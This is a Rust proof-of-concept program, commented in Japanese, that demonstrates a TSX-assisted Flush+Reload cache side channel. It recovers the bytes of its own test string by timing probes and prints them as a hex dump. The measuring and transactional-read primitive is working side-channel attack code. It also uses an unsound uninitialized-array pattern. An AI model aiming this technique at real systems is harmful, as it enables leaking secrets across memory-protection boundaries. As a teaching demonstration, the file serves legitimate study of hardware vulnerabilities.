use page_size;
use rtm;
use std::alloc::{alloc, Layout};
use std::arch::asm;
use std::mem::MaybeUninit;
use std::sync::atomic::fence;
use std::sync::atomic::Ordering::*;
use x86;

const PAGE_SIZE: usize = 4096;
const LINE_LEN: usize = 32;
const CHUNK_SIZE: usize = 8;

#[inline(always)]
unsafe fn flush(adrs: *const u8) {
    asm!(
        "mfence",
        "clflush {0}",
        in(reg) adrs,
    );
}

#[inline(always)]
unsafe fn flush_probe_buf(buf: *const u8) {
    for i in 0..256 {
        flush(buf.add(i * PAGE_SIZE))
    }
}

#[inline(always)]
fn time<F: FnOnce()>(f: F) -> u64 {
    fence(SeqCst);
    let start_time = unsafe { x86::time::rdtscp().0 };
    unsafe { asm!("lfence") };
    f();
    let result = unsafe { x86::time::rdtscp().0 as u64 - start_time };
    result
}

#[inline(always)]
unsafe fn probe(adrs: *const u8) -> u64 {
    time(
        #[inline(always)]
        || {
            adrs.read_volatile();
        },
    )
}

#[inline(always)]
unsafe fn guess_byte_once(secret: *const u8, buf: *const u8) -> u8 {
    // bufをキャッシュから完全にフラッシュする
    flush_probe_buf(buf);

    // トランザクションの開始を試みる
    if rtm::_xbegin() == !(0 as i32) {
        // *secretの値に基づいて、bufのある場所をキャッシュに持ってくる
        buf.add(secret.read_volatile() as usize * PAGE_SIZE)
            .read_volatile();

        // トランザクションを終了する
        rtm::_xend();
    } else {
        // トランザクションが開始できなかった場合は、
        // メモリアクセスの順序を制御するためのアセンブリ命令（フェンス命令）を呼び出す
        fence(SeqCst);
    }

    // bufの各ページの最初のキャッシュラインを読み取るのにかかった時間を計測する
    // 最小の時間を持つインデックスは、*secretの値である可能性が高い
    (0..256)
        .min_by_key(|i| probe(buf.add(i * PAGE_SIZE)))
        .unwrap() as u8
}

#[inline(never)]
unsafe fn guess_byte(secret: *const u8, buf: *const u8) -> u8 {
    const PROBE_COUNT: usize = 10;
    let mut hit_counts = [0; 256];

    for _ in 0..PROBE_COUNT {
        hit_counts[guess_byte_once(secret, buf) as usize] += 1;
    }

    hit_counts
        .iter()
        .enumerate()
        .max_by_key(|&(_, &item)| item)
        .unwrap()
        .0 as u8
}

#[inline]
fn human_readable(byte: u8) -> char {
    match byte {
        0x20..=0x7E => byte as char,
        _ => '.',
    }
}

#[inline(never)]
fn dump_hex(addr: *const u8, s: &[u8]) {
    assert!(s.len() <= LINE_LEN);

    print!("0x{:016X} | ", addr as usize);
    for chunk in s.chunks(CHUNK_SIZE) {
        for byte in chunk {
            print!("{:02X}", byte)
        }
        print!(" ")
    }
    let remainder = LINE_LEN - s.len();
    for _ in 0..remainder {
        print!("  ");
    }
    for _ in 0..remainder / 8 {
        print!(" ");
    }
    print!("| ");
    for &byte in s {
        print!("{}", human_readable(byte))
    }
    println!("");
}

fn main() {
    static TEST: &'static str = "This is a test string.";
    let start_addr = TEST.as_ptr();
    let len = TEST.len();

    let page_size = page_size::get();
    assert_eq!(page_size, PAGE_SIZE);

    let buf = unsafe {
        // 256ページ分のメモリを確保する
        alloc(Layout::from_size_align_unchecked(
            256 * page_size,
            page_size,
        ))
    };

    println!("buffer: 0x{:016X}, page size: {}", buf as usize, page_size);

    for chunk_start in (0..len).step_by(32) {
        let bytes_to_read = std::cmp::min(len - chunk_start, 32);
        let mut s: [u8; 32] = unsafe { MaybeUninit::uninit().assume_init() };
        for i in 0..bytes_to_read {
            unsafe {
                s[i] = guess_byte(
                    start_addr.add(chunk_start + i),
                    buf,
                );
            }
        }
        unsafe {
            dump_hex(start_addr.add(chunk_start), &s[..bytes_to_read]);
        }
    }
}
